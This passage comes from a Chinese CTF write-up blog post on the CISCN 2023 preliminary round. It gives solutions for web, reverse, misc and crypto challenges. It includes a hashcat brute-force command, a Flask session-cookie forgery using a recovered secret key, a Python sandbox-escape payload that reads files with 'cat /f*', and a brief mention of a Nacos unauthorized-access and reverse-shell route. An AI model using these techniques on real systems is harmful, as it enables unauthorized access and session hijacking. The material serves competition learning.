用hashcat爆破</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>hashcat</span> <span class=o>-</span><span class=n>m</span> <span class=mi>0</span> <span class=o>-</span><span class=n>a</span> <span class=mi>3</span> <span class=n>e6e69a980d637186e90656f2d9a5a1a8</span> <span class=mi>168924550</span><span class=err>?</span><span class=n>d</span><span class=err>?</span><span class=n>d</span><span class=err>?</span><span class=n>d</span><span class=err>?</span><span class=n>d</span><span class=err>?</span><span class=n>d</span><span class=err>?</span><span class=n>d</span><span class=err>?</span><span class=n>d</span><span class=err>?</span><span class=n>d</span><span class=err>?</span><span class=n>d</span><span class=err>?</span><span class=n>d</span>
</span></span></code></pre></div><p>（前面爆破出了，再爆破直接用&ndash;show显示结果）
<img class=lazyload src=/svg/loading.min.svg data-src="https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245982728-32d0997c-ce00-4d25-817b-6129fdefd63c.png#averageHue=%231b1b1b&clientId=u1129387b-6829-4&from=paste&height=71&id=u376f2527&originHeight=71&originWidth=843&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10277&status=done&style=none&taskId=u277b9fa4-f00e-403b-9053-e4cfa221987&title=&width=843" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245982728-32d0997c-ce00-4d25-817b-6129fdefd63c.png#averageHue=%231b1b1b&clientId=u1129387b-6829-4&from=paste&height=71&id=u376f2527&originHeight=71&originWidth=843&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10277&status=done&style=none&taskId=u277b9fa4-f00e-403b-9053-e4cfa221987&title=&width=843, https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245982728-32d0997c-ce00-4d25-817b-6129fdefd63c.png#averageHue=%231b1b1b&clientId=u1129387b-6829-4&from=paste&height=71&id=u376f2527&originHeight=71&originWidth=843&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10277&status=done&style=none&taskId=u277b9fa4-f00e-403b-9053-e4cfa221987&title=&width=843 1.5x, https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245982728-32d0997c-ce00-4d25-817b-6129fdefd63c.png#averageHue=%231b1b1b&clientId=u1129387b-6829-4&from=paste&height=71&id=u376f2527&originHeight=71&originWidth=843&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10277&status=done&style=none&taskId=u277b9fa4-f00e-403b-9053-e4cfa221987&title=&width=843 2x" data-sizes=auto alt="https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245982728-32d0997c-ce00-4d25-817b-6129fdefd63c.png#averageHue=%231b1b1b&clientId=u1129387b-6829-4&from=paste&height=71&id=u376f2527&originHeight=71&originWidth=843&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10277&status=done&style=none&taskId=u277b9fa4-f00e-403b-9053-e4cfa221987&title=&width=843" title=image.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>e6e69a980d637186e90656f2d9a5a1a8</span><span class=p>:</span><span class=mi>1689245500101730900</span>
</span></span></code></pre></div><p>伪造session（注意key后的空格）</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python</span> <span class=o>.</span>\<span class=n>flask_session_cookie_manager3</span><span class=o>.</span><span class=n>py</span> <span class=n>encode</span> <span class=o>-</span><span class=n>s</span> <span class=s2>&#34;9776436d6a1453cf13eceee8cda4fd84&#34;</span> <span class=o>-</span><span class=n>t</span> <span class=s2>&#34;{&#39;key&#39;: &#39;1689245500101730900&#39;}&#34;</span>
</span></span><span class=line><span class=cl><span class=n>eyJrZXkiOiIxNjg5MjQ1NTAwMTAxNzMwOTAwIn0</span><span class=o>.</span><span class=n>ZK_Zsg</span><span class=mf>.9</span><span class=n>oonOJJLBNz</span><span class=o>-</span><span class=n>XhXMQM9H7RCxo9Q</span>
</span></span></code></pre></div><p>访问/flag
<img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120953.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120953.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120953.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120953.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120953.png title=image-20230805012025756></p><h3 id=backendservice>BackendService</h3><p><a href=https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q target=_blank rel="noopener noreffer">https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q</a>
<a href=https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270 target=_blank rel="noopener noreffer">https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270</a>
<a href=https://xz.aliyun.com/t/11493#toc-5 target=_blank rel="noopener noreffer">https://xz.aliyun.com/t/11493#toc-5</a>
nacos漏洞
未授权；配置，反弹shell</p><h2 id=re>RE</h2><h3 id=babyre>babyre</h3><p><a href=https://snap.berkeley.edu/snap/snap.html target=_blank rel="noopener noreffer">https://snap.berkeley.edu/snap/snap.html</a>
<img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120763.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120763.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120763.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120763.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120763.png title=image-20230805012033416>
secret export</p><pre tabindex=0><code>102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30
</code></pre><p>exp.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>[</span><span class=mi>102</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>13</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>85</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>75</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>92</span><span class=p>,</span><span class=mi>92</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>81</span><span class=p>,</span><span class=mi>83</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>76</span><span class=p>,</span><span class=mi>88</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>73</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>86</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>87</span><span class=p>,</span><span class=mi>87</span><span class=p>,</span><span class=mi>82</span><span class=p>,</span><span class=mi>84</span><span class=p>,</span><span class=mi>85</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>85</span><span class=p>,</span><span class=mi>87</span><span class=p>,</span><span class=mi>30</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></div><h2 id=misc>MISC</h2><h3 id=被加密的生产流量>被加密的生产流量</h3><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120519.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120519.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120519.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120519.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120519.png title=image-20230805012051339>
<img class=lazyload src=/svg/loading.min.svg data-src="https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267575256-79ed8b60-28bf-403f-b961-822fc170da8a.png#averageHue=%23fbfbfa&clientId=ube04f257-9777-4&from=paste&height=275&id=u6bc42ac5&originHeight=624&originWidth=1212&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u4909d19d-b413-43c5-85ee-29b8519ea04&title=&width=534" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267575256-79ed8b60-28bf-403f-b961-822fc170da8a.png#averageHue=%23fbfbfa&clientId=ube04f257-9777-4&from=paste&height=275&id=u6bc42ac5&originHeight=624&originWidth=1212&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u4909d19d-b413-43c5-85ee-29b8519ea04&title=&width=534, https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267575256-79ed8b60-28bf-403f-b961-822fc170da8a.png#averageHue=%23fbfbfa&clientId=ube04f257-9777-4&from=paste&height=275&id=u6bc42ac5&originHeight=624&originWidth=1212&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u4909d19d-b413-43c5-85ee-29b8519ea04&title=&width=534 1.5x, https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267575256-79ed8b60-28bf-403f-b961-822fc170da8a.png#averageHue=%23fbfbfa&clientId=ube04f257-9777-4&from=paste&height=275&id=u6bc42ac5&originHeight=624&originWidth=1212&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u4909d19d-b413-43c5-85ee-29b8519ea04&title=&width=534 2x" data-sizes=auto alt="https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267575256-79ed8b60-28bf-403f-b961-822fc170da8a.png#averageHue=%23fbfbfa&clientId=ube04f257-9777-4&from=paste&height=275&id=u6bc42ac5&originHeight=624&originWidth=1212&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u4909d19d-b413-43c5-85ee-29b8519ea04&title=&width=534" title="https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267575256-79ed8b60-28bf-403f-b961-822fc170da8a.png#averageHue=%23fbfbfa&clientId=ube04f257-9777-4&from=paste&height=275&id=u6bc42ac5&originHeight=624&originWidth=1212&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u4909d19d-b413-43c5-85ee-29b8519ea04&title=&width=534"></p><h3 id=pyshell>pyshell</h3><p>python shell
字符串长度为7
python特性 下划线表示上次输出结果，拼接得到命令</p><pre tabindex=0><code>&#34;__import__(&#39;system&#39;).os(&#39;cat /f*&#39;)&#34;
eval(_)
</code></pre><h3 id=国粹>国粹</h3><p>题目.png从0开始标号，将a.png和k.png转化为编号列表，分别作为x和y，画出轨迹图</p><h2 id=crypto>Crypto</h2><h3 id=基于国密sm2算法的密钥密文分发>基于国密SM2算法的密钥密文分发</h3><p>非预期：
跟着文档操作login，allkey，quantum，在search中能直接看到quantumStringServer的值，在check提交
最后在search中看到flag</p><h3 id=可信度量>可信度量</h3><p>非预期：
grep寻找flag，发现在proc/22/task/22/environ
<img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121257.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121257.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121257.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121257.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121257.png title=image-20230805012110115></p><h3 id=sign_in_passwd>Sign_in_passwd</h3><pre tabindex=0><code>j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D
GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5
</code></pre><p>第二行url解码后作为编码表，再将第一行base64解码</p><h3 id=badkey1>badkey1</h3><p>第一步爆破sha256前四位
第二步找到p与q，使construct报错（应该要d和n不互素
e<em>d = k1</em>(p-1)<em>(q-1) + 1
d = k2</em>p<em>q
e</em>k2<em>p</em>q = k1*(p-1)*(q-1)+1</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-08-04</span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/ciscn2023%E5%88%9D%E8%B5%9B/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://githubmof.github.io/ciscn2023%E5%88%9D%E8%B5%9B/ data-title=CISCN2023初赛 data-hashtags=ctf><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://githubmof.github.io/ciscn2023%E5%88%9D%E8%B5%9B/ data-hashtag=ctf><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/ctf/>ctf</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/2022%E5%AF%92%E5%81%87/ class=prev rel=prev title=2022寒假><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>2022寒假</a>
<a href=/nssround#8-basic/ class=next rel=next title="NSSRound#8 Basic">NSSRound#8 Basic<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><span id=run-time></span></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2021 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://github.com/githubmof target=_blank>mof</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><div class=sidebar_wo><div id=leimu><img src=/images/sidebar_wo/leimuA.png alt=雷姆 onmouseover=/images/sidebar_wo/leimuB.png onmouseout=/images/sidebar_wo/leimuA.png title=回到顶部></div><div class=sidebar_wo id=lamu><img src=/images/sidebar_wo/lamuA.png alt=雷姆 onmouseover=/images/sidebar_wo/lamuB.png onmouseout=/images/sidebar_wo/lamuA.png title=回到底部></div></div><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/contrib/auto-render.min.js></script><script type=text/javascript src=/lib/katex/contrib/copy-tex.min.js></script><script type=text/javascript src=/lib/katex/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"06C5J0ZYUN",algoliaIndex:"githubmof",algoliaSearchKey:"a3cde6a74f0166767bdda9dbe2235fdb",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js></script>
<script type=text/javascript src=https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js></script><script type=text/javascript src=/js/custom.js></script></body></html>